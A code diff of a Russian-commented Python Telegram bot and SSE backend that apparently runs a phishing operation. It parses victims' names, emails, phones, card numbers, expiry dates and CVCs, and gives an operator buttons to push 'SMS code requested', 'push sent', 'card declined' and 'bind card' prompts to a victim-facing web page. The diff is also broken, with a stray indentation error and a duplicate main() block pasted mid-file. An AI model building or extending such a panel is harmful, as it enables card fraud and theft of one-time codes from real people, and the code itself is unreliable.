@@ -142,7 +142,7 @@ def send_command():
     except Exception as e:
         logger.error(f"❌ Ошибка отправки команды: {e}")
         response = jsonify({'error': str(e)})
-        origin = request.headers.get('Origin')
+                origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
             response.headers['Access-Control-Allow-Origin'] = origin
         return response, 500
@@ -459,138 +459,7 @@ async def send_sse_command(user_id, action_type, payment_id=None):
         logger.error(f"💥 Ошибка HTTP запроса: {e}")
         return False
 
-# ========== ОБЩАЯ ФУНКЦИЯ ДЛЯ СТАТУСОВ ПЛАТЕЖЕЙ ==========
-async def update_payment_status(callback, payment_id, user_id, status_text, action_type, card_number=None):
-    """Общая функция для обновления статуса платежа"""
-    success = await send_sse_command(user_id, action_type, payment_id)
-    
-    # Если номер карты не передан, извлекаем из сообщения
-    if not card_number:
-        card_number = extract_card_number(callback.message.text)
-    
-    # Берем оригинальное сообщение с данными карты
-    original_text = callback.message.text
-    
-    # Разбираем сообщение чтобы сохранить данные
-    lines = original_text.split('\n')
-    client_data = []
-    card_data = []
-    
-    for line in lines:
-        if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:']):
-            client_data.append(line)
-        elif any(keyword in line for keyword in ['Номер:', 'Срок:', 'CVC:']):
-            card_data.append(line)
-    
-    # ПРОВЕРЯЕМ СТАТУС КАРТЫ В БД СРАЗУ
-    is_card_attached = check_card_in_db(card_number)
-    
-    # ОПРЕДЕЛЯЕМ СТАТУС И ЭМОДЗИ
-    if is_card_attached:
-        card_status = "🟢 ПРИВЯЗАНАЯ КАРТА"
-    else:
-        card_status = "🟠 НЕ ПРИВЯЗАНАЯ КАРТА"
-    
-    # Собираем новое сообщение с красивым форматированием
-    new_text = f"💳 <b>{card_status}</b>\n\n"
-    new_text += "👤 <b>Клиент:</b>\n"
-    new_text += "\n".join(client_data) + "\n\n"
-    new_text += "💳 <b>Карта:</b>\n"
-    new_text += "\n".join(card_data) + "\n\n"
-    new_text += f"{status_text}\n\n"
-    new_text += "Выберите действие:"
-    
-    await callback.message.edit_text(
-        new_text,
-        reply_markup=get_payment_buttons(payment_id, user_id, card_number),
-        parse_mode="HTML"
-    )
-    return success
-
-# ========== ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ==========
-@dp.callback_query(F.data.startswith("sms_"))
-async def sms_code_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    payment_id = parts[1]
-    user_id = "_".join(parts[2:])
-    
-    # Извлекаем номер карты из сообщения
-    card_number = extract_card_number(callback.message.text)
-    
-    await update_payment_status(
-        callback, payment_id, user_id, 
-        "📱 <b>Статус: SMS код запрошен</b>", 
-        "sms",
-        card_number
-    )
-    await callback.answer("SMS код запрошен")
-
-@dp.callback_query(F.data.startswith("push_"))
-async def push_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    payment_id = parts[1]
-    user_id = "_".join(parts[2:])
-    
-    # Извлекаем номер карты из сообщения
-    card_number = extract_card_number(callback.message.text)
-    
-    await update_payment_status(
-        callback, payment_id, user_id,
-        "🔔 <b>Статус: Пуш отправлен</b>", 
-        "push",
-        card_number
-    )
-    await callback.answer("Пуш отправлен")
-
-@dp.callback_query(F.data.startswith("wrong_card_"))
-async def wrong_card_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    payment_id = parts[2]
-    user_id = "_".join(parts[3:])
-    
-    # Извлекаем номер карты из сообщения
-    card_number = extract_card_number(callback.message.text)
-    
-    await update_payment_status(
-        callback, payment_id, user_id,
-        "❌ <b>Статус: Карта отклонена</b>", 
-        "wrong_card",
-        card_number
-    )
-    await callback.answer("Карта отклонена")
-
-@dp.callback_query(F.data.startswith("bind_"))
-async def bind_card_handler(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    payment_id = parts[2]
-    user_id = "_".join(parts[3:-1])
-    card_number = parts[-1]
-    
-    logger.info(f"🔧 Привязка карты {card_number}")
-    
-    # Сохраняем карту в БД
-    success = save_card_to_db(card_number)
-    
-    if success:
-        await update_payment_status(
-            callback, payment_id, user_id,
-            "✅ <b>Статус: Карта привязана</b>", 
-            "bind",
-            card_number
-        )
-        await callback.answer("✅ Карта привязана")
-    else:
-        await callback.answer("❌ Ошибка привязки карты")
-
 # ========== ОБРАБОТКА ПЛАТЕЖНЫХ ДАННЫХ ==========
-@dp.message(F.chat.id == ADMIN_CHAT_ID)
-async def handle_admin_messages(message: types.Message):
-    logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
-    
-    if message.text and ("👤 Клиент:" in message.text or "• Имя:" in message.text):
-        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
-        await process_payment_data(message)
-
 async def process_payment_data(message: types.Message):
     try:
         lines = message.text.split('\n')
@@ -647,7 +516,6 @@ async def process_payment_data(message: types.Message):
             formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
             formatted_text += "Выберите действие:"
             
             await bot.send_message(
@@ -660,6 +528,151 @@ async def process_payment_data(message: types.Message):
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
+
+# ========== ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ==========
+@dp.callback_query(F.data.startswith("sms_"))
+async def sms_code_handler(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    payment_id = parts[1]
+    user_id = "_".join(parts[2:])
+    
+    # Извлекаем номер карты из сообщения
+    card_number = extract_card_number(callback.message.text)
+    
+    success = await send_sse_command(user_id, "sms", payment_id)
+    
+    # Обновляем сообщение со статусом SMS
+    original_text = callback.message.text
+    lines = original_text.split('\n')
+    
+    # Убираем старый статус если есть
+    new_lines = []
+    for line in lines:
+        if "📱 Статус:" not in line and "🔔 Статус:" not in line and "❌ Статус:" not in line:
+            new_lines.append(line)
+    
+    # Добавляем новый статус перед "Выберите действие:"
+    new_text = "\n".join(new_lines)
+    new_text = new_text.replace("Выберите действие:", f"📱 <b>Статус: SMS код запрошен</b>\n\nВыберите действие:")
+    
+    await callback.message.edit_text(
+        new_text,
+        reply_markup=get_payment_buttons(payment_id, user_id, card_number),
+        parse_mode="HTML"
+    )
+    await callback.answer("SMS код запрошен")
+
+@dp.callback_query(F.data.startswith("push_"))
+async def push_handler(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    payment_id = parts[1]
+    user_id = "_".join(parts[2:])
+    
+    # Извлекаем номер карты из сообщения
+    card_number = extract_card_number(callback.message.text)
+    
+    success = await send_sse_command(user_id, "push", payment_id)
+    
+    # Обновляем сообщение со статусом PUSH
+    original_text = callback.message.text
+    lines = original_text.split('\n')
+    
+    # Убираем старый статус если есть
+    new_lines = []
+    for line in lines:
+        if "📱 Статус:" not in line and "🔔 Статус:" not in line and "❌ Статус:" not in line:
+            new_lines.append(line)
+    
+    # Добавляем новый статус перед "Выберите действие:"
+    new_text = "\n".join(new_lines)
+    new_text = new_text.replace("Выберите действие:", f"🔔 <b>Статус: Пуш отправлен</b>\n\nВыберите действие:")
+    
+    await callback.message.edit_text(
+        new_text,
+        reply_markup=get_payment_buttons(payment_id, user_id, card_number),
+        parse_mode="HTML"
+    )
+    await callback.answer("Пуш отправлен")
+
+@dp.callback_query(F.data.startswith("wrong_card_"))
+async def wrong_card_handler(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    payment_id = parts[2]
+    user_id = "_".join(parts[3:])
+    
+    # Извлекаем номер карты из сообщения
+    card_number = extract_card_number(callback.message.text)
+    
+    success = await send_sse_command(user_id, "wrong_card", payment_id)
+    
+    # Обновляем сообщение со статусом WRONG CARD
+    original_text = callback.message.text
+    lines = original_text.split('\n')
+    
+    # Убираем старый статус если есть
+    new_lines = []
+    for line in lines:
+        if "📱 Статус:" not in line and "🔔 Статус:" not in line and "❌ Статус:" not in line:
+            new_lines.append(line)
+    
+    # Добавляем новый статус перед "Выберите действие:"
+    new_text = "\n".join(new_lines)
+    new_text = new_text.replace("Выберите действие:", f"❌ <b>Статус: Карта отклонена</b>\n\nВыберите действие:")
+    
+    await callback.message.edit_text(
+        new_text,
+        reply_markup=get_payment_buttons(payment_id, user_id, card_number),
+        parse_mode="HTML"
+    )
+    await callback.answer("Карта отклонена")
+
+@dp.callback_query(F.data.startswith("bind_"))
+async def bind_card_handler(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    payment_id = parts[2]
+    user_id = "_".join(parts[3:-1])
+    card_number = parts[-1]
+    
+    logger.info(f"🔧 Привязка карты {card_number}")
+    
+    # Сохраняем карту в БД
+    success = save_card_to_db(card_number)
+    
+    if success:
+        # Обновляем сообщение с новым статусом карты
+        original_text = callback.message.text
+        lines = original_text.split('\n')
+        
+        # Заменяем статус карты на привязанный
+        new_lines = []
+        for line in lines:
+            if "🟠 НЕ ПРИВЯЗАНАЯ КАРТА" in line:
+                new_lines.append("💳 <b>🟢 ПРИВЯЗАНАЯ КАРТА</b>")
+            elif "🟢 ПРИВЯЗАНАЯ КАРТА" in line:
+                new_lines.append("💳 <b>🟢 ПРИВЯЗАНАЯ КАРТА</b>")
+            else:
+                new_lines.append(line)
+        
+        new_text = "\n".join(new_lines)
+        
+        await callback.message.edit_text(
+            new_text,
+            reply_markup=get_payment_buttons(payment_id, user_id, card_number),
+            parse_mode="HTML"
+        )
+        await callback.answer("✅ Карта привязана")
+    else:
+        await callback.answer("❌ Ошибка привязки карты")
+
+# ========== ОБРАБОТКА СООБЩЕНИЙ АДМИНА ==========
+@dp.message(F.chat.id == ADMIN_CHAT_ID)
+async def handle_admin_messages(message: types.Message):
+    logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
+    
+    if message.text and ("👤 Клиент:" in message.text or "• Имя:" in message.text):
+        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ! Обрабатываем...")
+        await process_payment_data(message)
+        return  # ВАЖНО: возвращаемся чтобы не отправлять сообщение дважды
 
 # ========== ОСТАЛЬНЫЕ ОБРАБОТЧИКИ БОТА ==========
 @dp.message(Command("start"))
@@ -700,6 +713,16 @@ async def cmd_start(message: types.Message):
 Чтобы начать, нажмите кнопку ниже 👇
 """
         await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")
+
+# ... остальной код обработчиков заявок (оставить без изменений) ...
+
+async def main():
+    logger.info("🚀 Бот запускается...")
+    logger.info("🌐 SSE сервер запущен с CORS для GitHub Pages")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
 
 @dp.message(F.text == "🏠 Главное меню")
 async def main_menu(message: types.Message):
@@ -1027,6 +1050,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
